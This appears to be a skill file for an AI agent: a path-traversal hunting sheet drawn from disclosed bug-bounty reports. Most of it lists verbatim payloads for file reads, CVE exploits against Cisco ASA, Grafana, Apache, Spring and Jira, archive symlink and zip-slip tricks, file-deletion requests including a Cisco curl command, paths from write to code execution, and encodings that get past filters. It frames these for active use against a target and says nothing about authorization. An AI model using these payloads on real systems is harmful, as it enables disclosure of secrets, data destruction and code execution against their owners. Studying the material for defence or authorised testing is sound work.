---
name: hunter-l3-path-traversal
description: "Use when hunting Path Traversal on a target. Loads the L3 technique sheet: Path traversal (directory traversal) exploits insufficient validation of user-supplied path components, letting you read, write, or delete files outside an intended directory."
domain: cybersecurity
subdomain: web
tags:
- web
- path-traversal
- hunting
- l3
version: '1.0'
---

# Path Traversal — Technique Sheet

## Overview

Path traversal (directory traversal) exploits insufficient validation of user-supplied path components, letting you read, write, or delete files outside an intended directory. It pays best when chained: file read → config/secret disclosure → RCE, or file write/symlink → code execution. The records span web endpoints, archive extractors, Android content providers, and even sandboxed runtime permission models — the common root cause is always a path built from user input then used without normalization-or-canonicalization checks.

## Distinct sub-patterns

### 1. Classic parameter-based file read (`../` in query/body params)

- Endpoint shape:
  - `GET /{filePathDownload}` with `filePathDownload=/etc/passwd` (id=1542734)
  - `GET /login/downloadForm?filename=../../../../../../../../etc/hosts` (id=1888808)
  - `GET /File/Download?path=C:/WINDOWS/System32/drivers/etc/hosts` (id=1641148)
  - `POST /edit/process` with file path `../../../../etc/passwd` (id=122475, Imgur)
  - `POST /{path}/register/RegisterUserInfo.htm` with `registerUserInfoCommand.nextPageName=..%2f..%2f..%2fWEB-INF%2fweb.xml` (id=1007799)
- Payload that fired: `../../../../../../../../etc/hosts`, `/etc/passwd`, and URL-encoded `..%2f..%2f..%2fWEB-INF%2fweb.xml`.
- Root cause: parameter used to build a server-side file path with no whitelist or traversal sanitization; the nextPageName case is notable because a *page/template name* parameter becomes a file path.
- Impact: full /etc/passwd, /etc/hosts, Windows hosts file, WEB-INF/web.xml + app-config.xml + spring security config disclosure.
- Exemplars: id=1542734, id=1888808, id=1007799, id=1641148.

### 2. Framework/CVE file read on a known vulnerable endpoint

- Endpoint shapes and verbatim payloads:
  - Cisco ASA: `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../` (CVE-2020-3452; ids 1137321, 1415825)
  - Cisco ASA: `GET /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua` (ids 1555015, 2233418)
  - Cisco ASA file listing: `GET /+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b` (CVE-2018-0296; id=2375666)
  - Grafana: `GET /public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd` and unencoded variant `/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd` (ids 1415820, 1427086, 1419213)
  - Apache: `GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd` (CVE-2021-41773/42450 bypass; id=1404731)
  - Spring/MVC: `/blaze/../../../../../../Windows/win.ini` (CVE-2018-1271; id=1320084)
  - Jira: `GET /s/{slug}/_/;/WEB-INF/web.xml` (CVE-2021-26085/6; id=1369288)
- Root cause: endpoint-level path reflection without normalization; Grafana's static plugin handler did not decode/normalize `%2F../`; Apache's fix was defeated by double-encoded dot segments (`%%32%65` = `%2e`).
- Impact: unauthenticated arbitrary file read — /etc/passwd, portal_inc.lua, defaults.ini (Grafana DB creds), resolv.conf, web.xml pre-auth.
- Exemplars: id=1415820, id=1137321, id=1404731.

### 3. Nginx off-by-slash alias traversal

- Endpoint shape: `GET /metrics../{path}` — verbatim payload `/metrics../.bashrc` (id=1650273); also `GET /.git/config` via off-by-slash (id=1386547).
- Root cause: nginx `alias` directive missing trailing slash on the location, so `/metrics../` resolves one directory above the intended root. The .git case: off-by-slash exposed the .git directory.
- Impact: read /home/dist/.bashrc on nodejs.org infra; downloaded .git/config containing a GitHub username + token, then cloned the entire source repository.
- Exemplars: id=1650273, id=1386547.

### 4. Route/query normalization abuse (dot as resource ID, `..` as username)

- `GET /checkout-session?sessionId=.` — the Node SDK path-normalizes `.`/`..` in the session id, converting Retrieve-a-Session into List-all-Sessions with no auth; returned PII (emails, names, addresses) of all payments (id=1575014, Stripe).
- Username `..` in `GET /{username}/settings` — framework normalizes `/../settings` to `/settings`, demonstrating route confusion (id=152477, Gratipay).
- `GET /bin/querybuilder.json.css?path=/home&p.hits=full&p.limit=-1` — AEM querybuilder used as a directory lister for arbitrary paths (/home, /etc) (id=1313040, GSA).
- Root cause: traversal/normalization semantics leaking into application logic rather than filesystem access — often higher severity than it looks.
- Exemplars: id=1575014, id=1313040.

### 5. Symlink-in-archive → arbitrary read/write

- Endpoint shape: tar/zip extraction of user uploads. GitLab Bulk imports UploadsPipeline — payload: `ln -s /etc/passwd ./d3209c811fee407218bff7cb3b4333e6/passwd` inside uploads.tar.gz (id=1439593).
- RubyGems: crafted gem with `link -> /tmp` symlink, then `link/HACKED` written through it → /tmp/HACKED (id=270072). Separate gem metadata.gz `name` field `../../../../../../../../../../tmp/malicious` overwrote `gems/rack-2.0.3/bin/rackup` — running rackup printed `BOOOOM!` (id=243156).
- WordPress `unzip_file()`: zip entry `../../../../../../../../../../../../tmp/poc_file` extracted to OS /tmp; PHP in webroot = RCE (id=205481).
- PHP Phar/PharData entry paths (CVE-2015-6833) (id=104019).
- Root cause: extractors don't validate that normalized entry paths (or symlink targets) stay inside the destination directory.
- Impact: read /etc/passwd and /srv/gitlab/config/secrets.yml (secret_key_base, otp_key_base, db_key_base) via imported group uploads; arbitrary file overwrite → code execution.
- Exemplars: id=1439593, id=243156, id=270072.

### 6. Traversal write → RCE

- Rocket.Chat user data download: payload `../../../../../../etc/passwd`-style write; authenticated RCE via traversal write (id=1049367).
- Rails ActiveStorage Disk service: signed blob token carrying key `././../config/master.key`; with secret_key_base known, arbitrary read (config/master.key) and arbitrary write including ERB templates — `<% system('date') %>` executed (id=2334455).
- UniFi Video upload filename traversal on Windows → SYSTEM-level arbitrary write (id=129641). Avatar upload filename escaped the S3 images directory (id=254200, Unikrn).
- H1 ML service: `{"version":"v1","trained_at":"2023-01-01T00:00:00Z/../../.."}` interpolated into model dir path passed to `AutoTokenizer.from_pretrained` — placing a joblib file would give code execution (id=2032778).
- Exemplars: id=2334455, id=1049367, id=205481.

### 7. Traversal delete (DoS / data destruction)

- `GET /libraries/image-editor/image-edit.php?op=save&image_id=1&image_temp=../../../mainfile.php` — image_temp passed unsanitized to `unlink()`; deleted mainfile.php, killing the site; deleted files first copied to /uploads/imagemanager/logos/ giving content disclosure too (id=1081878, ImpressCMS).
- Cisco ASA: `curl -k -H "Cookie: token=../+CSCOU+/csco_logo.gif" https://target/+CSCOE+/session_password.html` — traversal in cookie token deletes web services files (CVE-2020-3187) (id=1555025).
- Exemplars: id=1081878, id=1555025.

### 8. Android / mobile app traversal (IPC + storage)

- Mattermost ShareActivity: share intent with `_display_name=../../lib-main/libyoga.so` overwrites a native lib → persistent code execution on next launch (id=1115864).
- Nextcloud/ownCloud upload filter bypass: `file:///data/user/0/com.nextcloud.client/shared_prefs/com.nextcloud.client_preferences.xml` — the `/data/data/` check bypassed using equivalent `/data/user/0/` path; protected prefs uploaded to a shared folder (CVE-2022-39210) (id=1408692). ownCloud: `file:///data/user/0/...cache/../shared_prefs/...preferences.xml` plus TITLE param writing .txt files into internal storage (id=1650270).
- IRCCloud ShareChooserActivity: `file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml` — decoded last path segment copies protected shared_prefs (session_key) to external storage → account takeover (id=288955).
- Basecamp deeplink: `?filename=/../../../../../../../../../../sdcard/Download/disclosure.txt` writes the report into shared external storage readable by any app (id=2553411).
- Nextcloud Talk: traversal tricks app into writing into its own root dir (CVE-2023-39957) (id=1997029).
- Exemplars: id=1115864, id=288955, id=1408692.

### 9. Sandbox/permission-model bypasses (Node.js, language stdlibs)

- Node.js `--experimental-permission` family (many CVEs):
  - `fs.writeFileSync("/home/kali/restricted/../secret.txt", ...)` — prefix check without `..` normalization (CVE-2023-30584, id=1952978)
  - `path.resolve = (s) => s; fs.readFileSync('/tmp/../etc/passwd')` — possiblyTransformPath() resolves dynamically (CVE-2023-39331, id=2225660)
  - Monkey-patching: `Buffer.prototype.utf8Write` override rewriting `/exploit/etc/passwd` → `/tmp/../etc/passwd` (id=2434811); `fs.readFileSync(new TextEncoder().encode("/tmp/../etc/passwd"))` — Uint8Array paths unchecked (id=2256167)
  - `fs.mkdir('/home/pathtraversal/../test0', ...)` via deprecated `process.binding('fs')` (CVE-2023-32558, id=2051257); `fs.mkdtemp` missing getValidatedPath (CVE-2023-32003); Buffer args (CVE-2023-32004); overwritable normalization utils (CVE-2024-21891); Windows `path.join` drive-name rooting (CVE-2025-23084)
- Ruby: `Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious",".rb"])` — backslashes in basename on Windows escape the temp dir (id=1131465).
- Exemplars: id=2225660, id=1952978, id=1131465.

### 10. Encoding / separator variants

- Windows backslash: `GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd` — read /etc/passwd outside web root (id=260420, Ubiquiti).
- Double-encoding: `%%32%65` for dot segments against Apache (id=1404731); `%2F`-encoded slashes against Grafana (id=1415820); `%2F` inside file:// URIs on Android (id=288955).
- Backslash-after-validation: Nextcloud `getFullPath` — validation runs before normalizePath, so `..\..\victim\files\target` becomes `../..` after backslash→slash conversion, letting one user overwrite another's files (id=1765631).
- Semicolon path params: `/s/{slug}/_/;/WEB-INF/web.xml` (id=1369288).
- Exemplars: id=260420, id=1765631.

### 11. Source-code / CLI sink findings (code-level proof)

- Unsanitized `arg[0]` → `java.io.FileOutputStream` (fabric-chaincode-java, id=1635321); CLI arg → `io.ioutil.ReadFile` (fabric, id=1664244); `os.Args[3]` → `resultPipeName` → `os.OpenFile` (id=1690377); `render params[:id]` as template path in Rails (CVE-2016-0752/2097, id=113831); Saba admin-dir traversal enabling admin login without admin account (id=1326352); portswigger.net `/cms/audioitems//etc/shadow` reading /etc/shadow as root (id=2424815); Node fs leak-by-error-message oracle: `timezone=../../../etc/` → "is a directory" vs "malformed time zone information" enumerating paths (id=118688, Shopify).

## Bypass / chain notes

- Encoding ladder: plain `../` → `%2e%2e%2f` → `..%2f` → `%2e%2e/` → double-encode `%%32%65%%32%65` (defeated Apache's patch). Test both `/` and `\` (Windows targets), and mixed.
- Path-equivalence bypasses: `/data/data/` ↔ `/data/user/0/` on Android defeated a prefix filter (id=1408692).
- Normalization-order bugs: validation before normalizePath (Nextcloud backslash case, id=1765631); prefix checks without `..` resolution (Node, id=1952978).
- Error-message oracles: "is a directory" vs "malformed time zone information" lets you enumerate paths without reading them (id=118688).
- High-value chains observed:
  1. Traversal read → secrets → RCE: ActiveStorage traversal + secret_key_base → ERB write → `<% system('date') %>` (id=2334455). GitLab symlink → secrets.yml (secret_key_base/otp_key_base/db_key_base) (id=1439593). Nginx off-by-slash → .git/config → GitHub token → full source clone (id=1386547).
  2. Traversal write → RCE: Rocket.Chat download write (id=1049367); WordPress zip entry into webroot (id=205481); Android lib overwrite (id=1115864).
  3. Traversal delete → full DoS: mainfile.php deleted (id=1081878).
  4. Traversal → session leak → account takeover: IRCCloud prefs.xml containing session_key (id=288955).

## Gotchas / what NOT to do

- Don't test only `/etc/passwd` — some filters blacklist it. The records show hits with `/etc/hosts`, `C:/WINDOWS/System32/drivers/etc/hosts`, `win.ini`, `WEB-INF/web.xml`, `portal_inc.lua`, `config/master.key`, `defaults.ini`.
- Don't assume a 200 means traversal: check body content (actual file contents vs app error page). Grafana reports came with verbatim /etc/passwd content as proof.
- Don't stop at read when write sinks exist — the highest-severity findings (Rocket.Chat, ActiveStorage, WordPress) all escalated write/delete to RCE/DoS.
- Don't overlook non-HTTP surfaces: Android intents, deeplinks, zip/tar/gem metadata, CLI args, and runtime permission models all paid out here.
- Don't ignore error differentials — Shopify's path-existence oracle was accepted and useful even without full reads.
- Be careful with deletion PoCs: deleting mainfile.php or csco_logo.gif is destructive; the Cisco deletion self-heals on reload, but on most targets you should prove on a file you own/can restore.

## Real-world impact examples

- Grafana on MTN infra: unauthenticated /etc/passwd (users infraop, deploy, postgres, redis, grafana), grafana defaults.ini, and /etc/resolv.conf (id=1427086).
- GitLab: extracted /srv/gitlab/config/secrets.yml with secret_key_base, otp_key_base, db_key_base and signing keys via a symlinked uploads tarball (id=1439593).
- Stripe sample-server quirk: `sessionId=.` returned PII (email, name, address) of every successful payment (id=1575014).
- Mattermost Android: replaced `libyoga.so` — malicious code runs on every app launch (id=1115864).
- IRCCloud: session_key copied to external storage → account takeover (id=288955).
- ImpressCMS: deleted mainfile.php, taking the whole site down (id=1081878).
- RubyGems: replaced rack-2.0.3/bin/rackup during `gem install` — code execution on next run of the installed binary (id=243156).